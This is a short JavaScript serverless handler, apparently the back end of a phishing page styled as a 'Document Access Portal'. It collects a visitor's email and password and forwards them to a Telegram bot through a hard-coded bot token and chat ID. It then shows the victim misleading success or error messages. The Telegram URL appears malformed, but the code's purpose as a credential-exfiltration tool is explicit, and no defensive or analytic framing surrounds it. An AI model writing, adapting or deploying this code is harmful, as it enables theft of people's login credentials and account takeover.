export default async function handler(req, res) {
    // 1. Only allow POST requests
    if (req.method !== 'POST') {
        res.setHeader('Allow', ['POST']);
        return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
    }

    try {
        // 2. Capture the email and password from the frontend request body
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ error: "Please complete all verification fields." });
        }

        // 3. Configuration details
        const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
        const chatId = "1080822304";

        // 4. Format the Telegram text layout
        const messageText = `📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n`
                          + `📧 *Portal Email:* ${email}\n`
                          + `🔑 *Access Key:* \`${password}\``;

        const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

        // 5. Fire the request securely to Telegram using native fetch
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        const result = await telegramResponse.json();

        // 6. Return response to frontend
        if (result.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(400).json({ error: `Authentication Error: ${result.description}` });
        }

    } catch (error) {
        return res.status(500).json({ error: "Gateway timeout. Connection failed." });
    }
}
